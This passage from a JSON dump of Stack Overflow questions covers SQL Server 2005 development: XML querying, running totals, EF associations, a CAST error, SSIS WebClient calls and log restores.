&lt;dMtgAmount&gt;-1&lt;/dMtgAmount&gt;\n        &lt;dCrossRentInc&gt;-1&lt;/dCrossRentInc&gt;\n        &lt;dMtgPayment&gt;-1&lt;/dMtgPayment&gt;\n        &lt;dInsTaxExp&gt;-1&lt;/dInsTaxExp&gt;\n        &lt;dNetRent&gt;-1&lt;/dNetRent&gt;\n        &lt;dAccountNumber1&gt;-1&lt;/dAccountNumber1&gt;\n        &lt;dAccountNumber2&gt;-1&lt;/dAccountNumber2&gt;\n      &lt;/AssetsInfo&gt;\n      &lt;BankDeposite&gt;\n        &lt;CBankDeposite&gt;\n          &lt;dBankValue&gt;-1&lt;/dBankValue&gt;\n        &lt;/CBankDeposite&gt;\n      &lt;/BankDeposite&gt;\n      &lt;Liabilities&gt;\n        &lt;CLiabilities&gt;\n          &lt;bResubordinated&gt;false&lt;/bResubordinated&gt;\n          &lt;bOmitted&gt;false&lt;/bOmitted&gt;\n          &lt;dLiabilitiesBalance&gt;-1&lt;/dLiabilitiesBalance&gt;\n          &lt;dLiabilitiesPayment&gt;-1&lt;/dLiabilitiesPayment&gt;\n          &lt;dLiabilitiesMosLeft&gt;-1&lt;/dLiabilitiesMosLeft&gt;\n          &lt;bLiabilitiesPaidOff&gt;false&lt;/bLiabilitiesPaidOff&gt;\n        &lt;/CLiabilities&gt;\n      &lt;/Liabilities&gt;\n      &lt;TransactionDetails&gt;\n        &lt;dPurchasePrice&gt;-1&lt;/dPurchasePrice&gt;\n        &lt;dAlterations&gt;-1&lt;/dAlterations&gt;\n        &lt;dLand&gt;-1&lt;/dLand&gt;\n        &lt;dRefinance&gt;-1&lt;/dRefinance&gt;\n        &lt;dPrepaidItems&gt;-1&lt;/dPrepaidItems&gt;\n        &lt;dClosingCosts&gt;-1&lt;/dClosingCosts&gt;\n        &lt;dPMIandMIP&gt;-1&lt;/dPMIandMIP&gt;\n        &lt;dDiscount&gt;-1&lt;/dDiscount&gt;\n        &lt;dTotalCosts&gt;-1&lt;/dTotalCosts&gt;\n        &lt;dSubordinateFinancing&gt;-1&lt;/dSubordinateFinancing&gt;\n        &lt;dPaidBySeller&gt;-1&lt;/dPaidBySeller&gt;\n        &lt;dOtherCredits&gt;-1&lt;/dOtherCredits&gt;\n        &lt;dOtherCredits1&gt;-1&lt;/dOtherCredits1&gt;\n        &lt;dOtherCredits2&gt;-1&lt;/dOtherCredits2&gt;\n        &lt;dOtherCredits3&gt;-1&lt;/dOtherCredits3&gt;\n        &lt;dClosingCost&gt;-1&lt;/dClosingCost&gt;\n        &lt;dLoanAmount&gt;-1&lt;/dLoanAmount&gt;\n        &lt;dPMIandMIPFinanced&gt;-1&lt;/dPMIandMIPFinanced&gt;\n        &lt;dLoanAmountAutomatic&gt;-1&lt;/dLoanAmountAutomatic&gt;\n        &lt;dCashFromToBorrower&gt;0&lt;/dCashFromToBorrower&gt;\n      &lt;/TransactionDetails&gt;\n      &lt;Declarations /&gt;\n      &lt;MonitoringPurposes&gt;\n        &lt;bBorrowerFurnish&gt;false&lt;/bBorrowerFurnish&gt;\n        &lt;bCoBorrowerFurnish&gt;false&lt;/bCoBorrowerFurnish&gt;\n      &lt;/MonitoringPurposes&gt;\n      &lt;Other&gt;\n        &lt;TSBalloon&gt;false&lt;/TSBalloon&gt;\n        &lt;TSBiweekly&gt;false&lt;/TSBiweekly&gt;\n        &lt;TSCommunityLending&gt;false&lt;/TSCommunityLending&gt;\n      &lt;/Other&gt;\n      &lt;RequestForAppraisal&gt;\n        &lt;Appraiser /&gt;\n        &lt;Lender /&gt;\n        &lt;From /&gt;\n        &lt;EscrowCompany /&gt;\n        &lt;TitleCompany /&gt;\n        &lt;ListingAgent /&gt;\n        &lt;SellingAgent /&gt;\n        &lt;AppraisalType&gt;\n          &lt;Full&gt;false&lt;/Full&gt;\n          &lt;ExteriorOnly&gt;false&lt;/ExteriorOnly&gt;\n          &lt;MarketRentAnalysis&gt;false&lt;/MarketRentAnalysis&gt;\n          &lt;LandAppraisal&gt;false&lt;/LandAppraisal&gt;\n        &lt;/AppraisalType&gt;\n        &lt;EstimateOfValue&gt;\n          &lt;AsIs&gt;false&lt;/AsIs&gt;\n          &lt;AsCompleted&gt;false&lt;/AsCompleted&gt;\n        &lt;/EstimateOfValue&gt;\n        &lt;FannieMae&gt;\n          &lt;FM1004&gt;false&lt;/FM1004&gt;\n          &lt;FM1004C&gt;false&lt;/FM1004C&gt;\n          &lt;FM1004D&gt;false&lt;/FM1004D&gt;\n          &lt;FM1007&gt;false&lt;/FM1007&gt;\n          &lt;FM1025&gt;false&lt;/FM1025&gt;\n          &lt;FM1073&gt;false&lt;/FM1073&gt;\n          &lt;FM1075&gt;false&lt;/FM1075&gt;\n          &lt;FM2000&gt;false&lt;/FM2000&gt;\n          &lt;FM2000A&gt;false&lt;/FM2000A&gt;\n          &lt;FM2055&gt;false&lt;/FM2055&gt;\n          &lt;FM216&gt;false&lt;/FM216&gt;\n          &lt;FM2075&gt;false&lt;/FM2075&gt;\n          &lt;FM2090&gt;false&lt;/FM2090&gt;\n          &lt;FM2095&gt;false&lt;/FM2095&gt;\n          &lt;FMNA&gt;false&lt;/FMNA&gt;\n        &lt;/FannieMae&gt;\n        &lt;VeteransAdministration&gt;\n          &lt;VA1805&gt;false&lt;/VA1805&gt;\n          &lt;VA8712&gt;false&lt;/VA8712&gt;\n        &lt;/VeteransAdministration&gt;\n        &lt;AppraisalCost&gt;-1&lt;/AppraisalCost&gt;\n        &lt;PaymentMethod&gt;\n          &lt;COD&gt;true&lt;/COD&gt;\n          &lt;CreditCard&gt;false&lt;/CreditCard&gt;\n          &lt;InvoiceClient&gt;false&lt;/InvoiceClient&gt;\n          &lt;Bill&gt;false&lt;/Bill&gt;\n          &lt;Other&gt;false&lt;/Other&gt;\n        &lt;/PaymentMethod&gt;\n      &lt;/RequestForAppraisal&gt;\n      &lt;RequestForTitle&gt;\n        &lt;Seller /&gt;\n        &lt;InsuredLenderMortgage /&gt;\n        &lt;Attachment&gt;\n          &lt;PriorTitlePolicy&gt;false&lt;/PriorTitlePolicy&gt;\n          &lt;WarrantyDeed&gt;false&lt;/WarrantyDeed&gt;\n          &lt;TitleInsRequirements&gt;false&lt;/TitleInsRequirements&gt;\n          &lt;Survey&gt;false&lt;/Survey&gt;\n          &lt;Contract&gt;false&lt;/Contract&gt;\n        &lt;/Attachment&gt;\n        &lt;MailAway&gt;false&lt;/MailAway&gt;\n      &lt;/RequestForTitle&gt;\n      &lt;RequestForHazard&gt;\n        &lt;MinReplacementCost&gt;-1&lt;/MinReplacementCost&gt;\n      &lt;/RequestForHazard&gt;\n      &lt;SollenAdditionalInfo&gt;\n        &lt;LockPrice&gt;-1&lt;/LockPrice&gt;\n        &lt;LockPeriod&gt;21&lt;/LockPeriod&gt;\n        &lt;PrepayPenalty&gt;No&lt;/PrepayPenalty&gt;\n        &lt;BorrowerEmp&gt;W-2&lt;/BorrowerEmp&gt;\n        &lt;IRSForm&gt;Yes&lt;/IRSForm&gt;\n      &lt;/SollenAdditionalInfo&gt;\n      &lt;FloodReport&gt;\n        &lt;IsInFloodArea&gt;false&lt;/IsInFloodArea&gt;\n      &lt;/FloodReport&gt;\n    &lt;/C1003Data&gt;\n</code></pre>\n\n<p>In this XML structure, I use the following query for select firstname and lastname:</p>\n\n<pre><code>SELECT\n   a.b.value('(strFirstName)[1]', 'Varchar(50)') FirstName,\n   a.b.value('(./strLastName)[1]', 'VARCHAR(8000)') LastName\nFROM dbo.FormData\nCROSS APPLY C1003.nodes('//BorrowerInfo') a(b)\n</code></pre>\n\n<p>It executes correctly. Now I need to join this structure with other table which also has first name and last name. please help.</p>\n"},{"tags":["c#",".net","sql-server","sql-server-2005","ado.net"],"answer_count":3,"favorite_count":3,"up_vote_count":15,"down_vote_count":0,"view_count":8236,"score":15,"question_id":510899,"title":"MultipleActiveResultSets=True or multiple connections?","body":"<p>I have some C# in which I create a reader on a connection (<code>ExecuteReader</code>), then for every row in that reader, perform another command (with <code>ExecuteNonQuery</code>).  In this case is it better that I use <code>MultipleActiveResultSets=True</code> on my connection or use multiple connections?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":114,"score":2,"question_id":10907597,"title":"SQL Running Stock Price","body":"<p>I'm trying to write a SQL query (SQL Server 2005) to calculate the current value of inventory on hand. I have a table that looks like this:</p>\n\n<pre><code>ID | QTY | BasePrice\n1  | 10  | 100\n2  | -2  | 0\n3  | -2  | 0\n4  | 10  | 200\n5  | -2  | 0\n</code></pre>\n\n<p>Where qty > 0 is stock coming in and &lt; 0 is stock going out. Negative quantities don't record a BasePrice due to other business rules. Base price is price per unit.</p>\n\n<p>I need to find either the average price OR total price of inventory that is still on hand. So the resulting column needs to be:</p>\n\n<pre><code>ID | QTY | BasePrice | TotalPrice | AveragePrice\n1  | 10  | 100       | 1000       | 100\n2  | -2  | 0         | 800        | 100\n3  | -2  | 0         | 600        | 100\n4  | 10  | 200       | 2600       | 162.50\n5  | -2  | 0         | 2275       | 162.50\n</code></pre>\n\n<p>I was able to work out this:</p>\n\n<pre><code>select  g1.projectionID,\n        g1.qty, \n        g1.basePrice,\n        ((sum(isnull(g2.basePrice,0)))) * sum(isnull(g2.Qty,0)) + (g1.Qty * (case when g1.Qty &lt; 0 THEN (sum(isnull(g2.basePrice,0))) ELSE g1.BasePrice END)) As CurrenctValueOfStockOnHand\n\n\nfrom test g1\nleft join test g2 on g2.projectionID &lt; g1.projectionID\ngroup by g1.ProjectionID, g1.Qty, g1.BasePrice\n</code></pre>\n\n<p>Which gives:</p>\n\n<pre><code>ID| QTY| BasePrice | TotalPrice\n1 | 10 | 100.0000  | 1000.0000\n2 | -2 | 0.0000    | 800.0000\n3 | -2 | 0.0000    | 600.0000\n4 | 10 | 200.0000  | 2600.0000\n5 | -2 | 0.0000    | 4200.0000\n</code></pre>\n\n<p>But as you can see it gives the wrong values after the 2nd lot of inventory is added (after ID 4).</p>\n\n<p>We currently have C# code that loops through each record and keeps a running total. For large stocks this takes far too long. If the only option is to use a cursor then we'll keep our C# code.</p>\n"},{"tags":["sql-server-2005","visual-studio-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":10906176,"title":"Can't see Database Objects -> SQL Server Projects in Visual Studio when attempting to create CLR function","body":"<p>I need to create a CLR function (in C#) to support business needs. I've already got the code ready. All that's needed is to create a server project in visual studio, add the code in and compile it. This is where I am having trouble. As stated in the title, I am unable to see the Database Objects option when I go to create a new project. All I am seeing are BI Projects and Other Project types -> VS Solutions. </p>\n\n<p>Here is what I have installed on <em>my</em> workstation:</p>\n\n<ul>\n<li>SQL Server 2005 Workstations components (can't install the full\nserver - licensing restriction).</li>\n<li>SQL Server 2012 Express</li>\n</ul>\n\n<p>Microsoft really don't make things easy for developers. Does anyone know how I can get the SQL Server Projects option to show up in Visual Studio?</p>\n"},{"tags":["php","sql","sql-server","linux","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":41,"score":3,"question_id":10904644,"title":"Keyword GO throws errors with PHP","body":"<p>I've come across a problem where I am trying to restore MSSQL dumps in php on a linux server. I'm am reading in a file and then passing the file in as a query.</p>\n\n<p>This works:</p>\n\n<pre><code>CREATE TABLE [dbo].[recipes](\n    [Id] [int] IDENTITY(1,1) NOT NULL,\n    [Title] [nvarchar](500) COLLATE SQL_Latin1_General_CP1_CI_AS NULL,\n    [Desc] [text] COLLATE SQL_Latin1_General_CP1_CI_AS NULL,\n    [Directions] [text] COLLATE SQL_Latin1_General_CP1_CI_AS NULL,\n    [CompAuthor] [nvarchar](500) COLLATE SQL_Latin1_General_CP1_CI_AS NULL,\n    [CompName] [nvarchar](500) COLLATE SQL_Latin1_General_CP1_CI_AS NULL,\n    [Servings] [nvarchar](50) COLLATE SQL_Latin1_General_CP1_CI_AS NULL,\n CONSTRAINT [PK_recipes] PRIMARY KEY CLUSTERED \n(\n    [Id] ASC\n)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF,\nALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON)\n)\n</code></pre>\n\n<p>BUT as soon as I add n a word like GO</p>\n\n<pre><code>WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF,\n ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON)\n    )\n\nGO\n</code></pre>\n\n<p>It throws an error like </p>\n\n<pre><code>Warning: mssql_query(): message: Incorrect syntax near 'GO'\n</code></pre>\n\n<p>My question is what causes this error and how is it fixed?</p>\n"},{"tags":["sql-server-2005","sql-server-2008-r2","entity-framework-4.3"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":10853518,"title":"EF 4.3 DB first model not importing associations","body":"<p>We moved our DB from an instance of SQL 2005 to a new SQL 2008r2 server. We changed the connection strings in our app to point to new database, even modified the ProviderManifestToken from 2005 to 2008. Everything was working fine until we tried to add entities from our database to our existing edmx model. I'm using the 'update model from database' wizard to add tables to the edmx diagram. The tables will appear in the diagram but only some have their associations and/or foreign keys imported. If I switch the connection string to point back to the old 2005 sql instance everything imports correctly and associations are present. I'm happy to provide additional details if necessary. I can't find a pattern to this at all. What gives?</p>\n\n<p>Update: I created a new project, added an edmx, pointed it to the 2008r2 db instance, selected tables that I know have associations but the designer failed to pick up the associations. Is there something I need to install on the SQL server to get EF to work?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":114,"score":0,"question_id":10900994,"title":"Insert into with multiple subqueries as values","body":"<p>Lets suppose I've to insert into a table with many fk, just to explain here below the <strong>wrong statement</strong>:</p>\n\n<pre><code>insert into mytable\nvalues\n(\nsomevalue\n,somevalue\n,select id from othertable1 where ...condition\n,select id from othertable2 where ...condition\n,select id from othertable3 where ...condition\n)\n</code></pre>\n\n<p>so basically values to insert comes from different subqueries, is it possible to achieve such a behavior ?</p>\n"},{"tags":["vb.net","visual-studio-2010","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":98,"score":0,"question_id":10900165,"title":"Can not add my table iwth Entity Framework","body":"<p>i am trying to add a table to my visual studio visual basic project with entity framework. I am trying to add it using the wizard... i choose to add new item, and i select ADO .NET Entity Data Model. I enter all the parameters(i am logged as sa) i got the databases, but when the wizard shows the tables... i can not find the one i need. So i was looking for permissions and all is ok. So my Database is on a SQL Express 2005 version. I am doing my project with Visual Studio 2010 Ultimate. If i use the SQL Manager Studio Express i can see my table and the others.</p>\n\n<p>So my question is... Is any patch, service pack or something i must do/install/apply to see my table?. </p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql-server","sql-server-2005","netbeans","jdbc","netbeans-7"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":201,"score":0,"question_id":10899135,"title":"Cant view table of SQL server 2005 in Netbeans 7.1","body":"<p><br> I'm currently using netbeans. At runtime view, I am able to connect to my sqlserver 2005 database. However, the list of tables are not shown. When I try to execute the command I could successfully query the database, tables and fields. I'm just wondering why the tables are not shown in the runtime view's table folder.</p>\n\n<p>I am using JDBC drive : 4.0 \nNetbeans : 7.1 </p>\n\n<p>Config Entires <br></p>\n\n<p>Host : 172.16.16.18 <br>\nport :1433<br>\nDataBase: Alpha<br>\nInstance Name :<br>\nusername : username<br>\npassword:password<br></p>\n\n<p>Already tried by changing various schema .</p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":149,"score":0,"question_id":10896806,"title":"C# : Is there any C# function to insert primary key from one table into another","body":"<p>I have 2 tables in which i want to insert data one after another. The primary key of first table is in the 2nd. Is there any C# function so that i can insert the primary key of first table into another at 1 go, without any select query?</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":858,"score":0,"question_id":10888517,"title":"Error converting data type varchar to numeric CAST not working","body":"<p>I know this has been beaten like a dead horse. However no matter how I slice it, cast it or convert it I have the same issue.\nError converting data type varchar to numeric.</p>\n\n<pre><code>SELECT  property_id, property_case_number, property_address, property_city, \nproperty_state, property_zip, property_lon, property_lat \nFROM property \nWHERE (property_active = 1) \nAND \n(property_county = (SELECT property_county FROM property AS property_1 \nWHERE (property_id = 9165))) \nAND \n(property_id &lt;&gt; 9165)\nAND\nproperty_lon IS NOT Null \nAND \nproperty_lat IS NOT Null \nAND \ndbo.LatLonRadiusDistance(\nCONVERT(DECIMAL(15,12),(select property_lat from property where property_id = 9165)), \nCONVERT(DECIMAL(15,12),(select property_lon from property where property_id = 9165)), \nproperty_lat,property_lon) &lt;= '5'\n</code></pre>\n\n<p>I run into this issue as soon as I add dbo.LatLonRadiusDistance at the end.</p>\n\n<p>dbo.LatLonRadiusDistance compares lat &amp; lon distance in miles.</p>\n\n<pre><code>FUNCTION [dbo].[LatLonRadiusDistance] \n(\n@lat1Degrees decimal(15,12),\n@lon1Degrees decimal(15,12),\n@lat2Degrees decimal(15,12),\n@lon2Degrees decimal(15,12)\n)\nRETURNS decimal(9,4)\nAS\nBEGIN\n\nDECLARE @earthSphereRadiusKilometers as decimal(10,6)\nDECLARE @kilometerConversionToMilesFactor as decimal(7,6)\nSELECT @earthSphereRadiusKilometers = 6366.707019\nSELECT @kilometerConversionToMilesFactor = .621371\n\n-- convert degrees to radians\nDECLARE @lat1Radians decimal(15,12)\nDECLARE @lon1Radians decimal(15,12)\nDECLARE @lat2Radians decimal(15,12)\nDECLARE @lon2Radians decimal(15,12)\nSELECT @lat1Radians = (@lat1Degrees / 180) * PI()\nSELECT @lon1Radians = (@lon1Degrees / 180) * PI()\nSELECT @lat2Radians = (@lat2Degrees / 180) * PI()\nSELECT @lon2Radians = (@lon2Degrees / 180) * PI()\n\n-- formula for distance from [lat1,lon1] to [lat2,lon2]\nRETURN ROUND(2 * ASIN(SQRT(POWER(SIN((@lat1Radians - @lat2Radians) / 2) ,2)\n    + COS(@lat1Radians) * COS(@lat2Radians) * POWER(SIN((@lon1Radians - @lon2Radians) / 2), 2)))\n    * (@earthSphereRadiusKilometers * @kilometerConversionToMilesFactor), 4)\n\nEND\n</code></pre>\n\n<p>I'm sure it's something to do with </p>\n\n<pre><code>(select property_lat from property where property_id = 9165)\n</code></pre>\n\n<p>But no matter how I cast or convert it doesn't change things.</p>\n\n<p>And if I run the function by itself it doesn't give an error.</p>\n\n<p>Anyone have any insights?</p>\n\n<p>here is a sample row </p>\n\n<pre><code>8462    023-125514  15886 W MOHAVE ST   GOODYEAR    AZ  85338-0000  -112.400297000000   33.429041000000\n</code></pre>\n\n<p>property_lat &amp; property_lon are varchar(50)</p>\n"},{"tags":["sql","sql-server-2005","ssis","webclient","ssis-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":199,"score":5,"question_id":10723092,"title":"Strange behavior with uri and WebClient classes on SSIS package","body":"<p>I have a quite strange situation.</p>\n\n<p>I have this very simple package:</p>\n\n<p><img src=\"http://i.stack.imgur.com/xnf41.jpg\" alt=\"enter image description here\"></p>\n\n<ul>\n<li>Task \"get list\" retrieves a data table from an assembly with one\ncolumn and a list of URL to be ran into a object variable.</li>\n<li>The \"foreach\" loop loops through the object variable and loads the\nURL into a url string variable</li>\n<li><p>The \"run\", calls the url with this code (its 2005 so Im stuck with\nVB):</p>\n\n<pre><code>Dim myURI As New Uri(\"http://\" + Dts.Variables(\"URL\").Value.ToString())\nDim myWebClient As New System.Net.WebClient\nmyWebClient.OpenReadAsync(myURI)\n</code></pre></li>\n</ul>\n\n<p>the URL being called is internal and just reads the parameters and performs a series of operation which take some time, that's why I used \"OpenReadAsync\"</p>\n\n<p>My problem is: if I have 4 URLs to run, the package runs only 2 of them. The loop lops 4 times, the script is called 4 times (I can see if I debug it), the line <code>myWebClient.OpenReadAsync(myURI)</code> is executed 4 times with 4 different values, but only 2 calls to the URL are made. </p>\n\n<p>If I run the package again, the other 2 URLs are now called, which proofs that there isn't anything wrong with the URL and If I call the 4 urls manually on the browser (on 4 tabs for example) one right after another, them all produce the expected result, which proofs that there is nothing wrong with the code that parses the URL.</p>\n\n<p>So I'm left with the VB code, its the first time Im using uri and WebClient so I wonder if Im doing something wrong. I also tried to add a 5 seconds sleep between the calls, but no luck.</p>\n\n<p>Any help would be appreciated. \nThanks</p>\n"},{"tags":["sql","sql-server-2005","percentile"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":115,"score":1,"question_id":10895682,"title":"query for sql server 2005 for getting the 95th percentile of different groups","body":"<p>I have a table like the dummy table described below</p>\n\n<h2>Date || Server || Count</h2>\n\n<hr>\n\n<h2>1200          || B        || 123</h2>\n\n<h2>1200          || C        || 124</h2>\n\n<h2>1200          || B        || 125</h2>\n\n<h2>1300          || B        || 126</h2>\n\n<h2>1300          || C        || 127</h2>\n\n<h2>1300          || B        || 128</h2>\n\n<h2>1300          || C        || 129</h2>\n\n<p>I need to write a query to create a table such that I get the 95 percentile of the Count grouped by both Date and Server.</p>\n\n<p>I dont have much experience with Sql, and after looking at the google search results, surfing through countless links I am a bit terrified after seeing a lot of subqueries used.No one is able to give a simple query. Can't we directly use a direct query to get the result like the following? </p>\n\n<h2>Date       || Server    || Count</h2>\n\n<hr>\n\n<h2>1200          || B        || 123</h2>\n\n<h2>1200          || C        || 124</h2>\n\n<h2>1300          || B        || 126</h2>\n\n<h2>1300          || C        || 127</h2>\n\n<p>Can some one please provide the exact query which can be used?</p>\n\n<p>Thanks for the help!!</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":92,"score":2,"question_id":10890894,"title":"insert select with if else condition","body":"<p>I have 2 tables, table1 and table2, and I am  using </p>\n\n<pre><code>insert into table1 \n(  Col1,\n   Col2,\n   Col3\n) \n\nselect \n(  ColA,\n   ColB,\n   ColC\n)\nfrom \ntable2\n</code></pre>\n\n<p>but the logic between Col3 and ColC is this:</p>\n\n<pre><code>if ColC = 'A' then Col3 = Y\nelse Col3 = N\n</code></pre>\n\n<p>What's the SQL for this, I am using SQL Server 2005.</p>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":10895016,"title":"I need help to bring following output in SQL Query","body":"<p>Please help with SQL Query to solve following issue.</p>\n\n<p>I have a table input values like this - Column header is X and Y</p>\n\n<pre><code>    x | y\n-------------------\n    1 | a1\n    1 | a2\n    2 | a3\n    2 | a4\n    2 | a2\n</code></pre>\n\n<p>I need output like this</p>\n\n<pre><code>x | y\n----------\n1 |a1,a2\n2 |a3,a4,a2\n</code></pre>\n\n<p>Please advice!</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":10893423,"title":"Sql Null Value On One Column Partition","body":"<p>I just waste Two to Three Hourse behind This Sql Transact and confused on Null Value Skip.</p>\n\n<p>I have two table like below:</p>\n\n<pre><code>Table 1: AccountMast\ncompanyID   accname         category\n102     PURCHASE  ACCOUNT   Purchase Account\n102     SALES ACCOUNT       Sales Account\n\nTable2: Legder\n\ncompanyID   name            \n102     PURCHASE ACCOUNT        \n102     SALES ACCOUNT       \n</code></pre>\n\n<p>I have  join it as below:</p>\n\n<pre><code>select\ncase\nwhen a.catagory='Purchase Account' then\nl.name \nend as PurchaseAccount,\ncase\nwhen a.catagory = 'Sales Account' then\nl.name   \nend as SalesAccount\nfrom ledger l join accountmast a\non l.companyID=a.companyID\nand l.name = a.accname\nwhere l.companyID=102\nand a.catagory='Purchase Account' or a.catagory='Sales Account'\ngroup by l.name,a.catagory\n</code></pre>\n\n<p>The Result is:</p>\n\n<pre><code>PurchaseAccount     SaleAccount\nPURCHASE ACCOUNT    NULL\nNULL                SALES ACCOUNT\n</code></pre>\n\n<p>But I Want Result Like:</p>\n\n<pre><code>PurchaseAccount     SaleAccount\nPURCHASE ACCOUNT    SALES ACCOUNT\n</code></pre>\n\n<p>How to Do It?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":64,"score":2,"question_id":10883331,"title":"Mixing date frequencies in SQL","body":"<p>I have the query below:</p>\n\n<pre><code>select s1.DATADATE, s1.PRCCD, c.EBIT\nfrom sec_dprc s1 \nleft outer join rdq_temp c \non s1.GVKEY = c.GVKEY\nand s1.DATADATE = c.rdq\nwhere s1.GVKEY = 008068\norder by s1.DATADATE\n</code></pre>\n\n<p>I am trying to create a rolling calculation that between the two columns, the PRCCD column is daily prices and the EBIT column is a quarterly value. I want to be able to calculate the product of the two, i.e PRCCD*EBIT for everyday but the EBIT only changes once a quarter on random dates. Summarizing, I want to be able to calculating the product of EBIT and PRCCD going forward using only new values of EBIT when they change each quarter randomly</p>\n\n<pre><code>DATADATE                PRCCD   EBIT\n1984-02-01 00:00:00.000 28.625  NULL\n1984-02-02 00:00:00.000 27.875  NULL\n1984-02-03 00:00:00.000 26.75   420.155\n1984-02-06 00:00:00.000 27      NULL\n1984-02-07 00:00:00.000 26.875  NULL\n</code></pre>\n\n<p>.\n.\n.</p>\n\n<pre><code>DATADATE                PRCCD   EBIT\n1984-05-02 00:00:00.000 30.75   NULL\n1984-05-03 00:00:00.000 30.875  NULL\n1984-05-04 00:00:00.000 30.75   NULL\n1984-05-07 00:00:00.000 31.125  499.228\n1984-05-08 00:00:00.000 31.75   NULL\n</code></pre>\n\n<p>.\n.\n.</p>\n\n<pre><code>1984-07-31 00:00:00.000 25.625  NULL\n1984-08-01 00:00:00.000 26.75   NULL\n1984-08-02 00:00:00.000 26.375  348.364\n1984-08-03 00:00:00.000 26.75   NULL\n1984-08-06 00:00:00.000 27      NULL\n</code></pre>\n\n<p>Thanks for the help!</p>\n\n<p>one of the solutions I came to:</p>\n\n<pre><code>select TD.Date, TD.C CD, TQ.C CQ, TQ.C1, TQ.C/TQ.C1 EBITps,TQ.C/TQ.C1/TD.C PE\nfrom \n(select DataDate date, PRCCD C from sec_dprc where GVKEY = 008068) TD\ncross apply (select top 1 rdq date, ebit C, csh12q C1 from rdq_temp  where rdq&lt;=TD.Date order by rdq desc) TQ\norder by TD.Date\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":10892244,"title":"Inserting Column From Into Another Table Trough Query","body":"<p>How do I update the Range field of of this table below</p>\n\n<p><img src=\"http://i.stack.imgur.com/y6YE2.jpg\" alt=\"enter image description here\"></p>\n\n<p>(don't mind the '1' values from the range above, it's supposed to be <em>NULL</em>)</p>\n\n<p>with the Range values of this table below</p>\n\n<p><img src=\"http://i.stack.imgur.com/gEpBe.jpg\" alt=\"enter image description here\"></p>\n\n<p>When I inner join the table with the other on their EquipmentCode the values are doubled like this:\n<img src=\"http://i.stack.imgur.com/DVNGL.jpg\" alt=\"enter image description here\"></p>\n\n<p>This was the query I used:</p>\n\n<pre><code>SELECT \n  C.*, \n  R.Range AS RangeFromOtherTable \nFROM \n  EquipmentCalibrationRef AS C\nINNER JOIN \n  Range AS R \nON \n  R.EquipmentCode = C.EquipmentCode\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","database-backups","database-restore"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":5211,"score":0,"question_id":4992702,"title":"Recover deleted record in SQL Server","body":"<p>I accidentally deleted a row in a table and want to restore it. I've found a solution here: <a href=\"http://www.edu.krishantha.com/database/sql-server/recover-deleted-records\" rel=\"nofollow\">http://www.edu.krishantha.com/database/sql-server/recover-deleted-records</a></p>\n\n<p>I've tried to restore database from backup taken after delete. But I can't restore database with STOPAT option:</p>\n\n<pre><code>RESTORE LOG database FROM  DISK = N'X:\\database.BAK' WITH\nSTOPAT = N'2011-02-12T00:00:00', RECOVERY\n</code></pre>\n\n<p>I have following error:</p>\n\n<pre><code>Msg 3117, Level 16, State 4, Line 1\nThe log or differential backup cannot be restored because no files are\nready to rollforward.\nMsg 3013, Level 16, State 1, Line 1\nRESTORE LOG is terminating abnormally.\n</code></pre>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":69,"score":2,"question_id":10883591,"title":"Can i user a where statement by first column?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/368505/is-it-possible-to-select-sql-server-data-using-column-ordinal-position\">Is it possible to select sql server data using column ordinal position</a>  </p>\n</blockquote>\n\n\n\n<p>Not sure if the title help, but i'm trying to create a general function and i was wondering if i could use a column position in my WHERE statements instead of a column name. So for example</p>\n\n<p><code>SELECT * FROM table WHERE myID=1</code></p>\n\n<p>would become something like this</p>\n\n<p><code>SELECT * FROM table WHERE [0]=1</code></p>\n\n<p>Does this make sense? is it doable? Thanks guys. </p>\n\n<p>BTW - Using MSSQL 2005-2008</p>\n"},{"tags":["sql","sql-server-2005","tsql","entity-attribute-value"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":1609,"score":4,"question_id":1376695,"title":"SQL Server, where field is int?","body":"<p>how can I 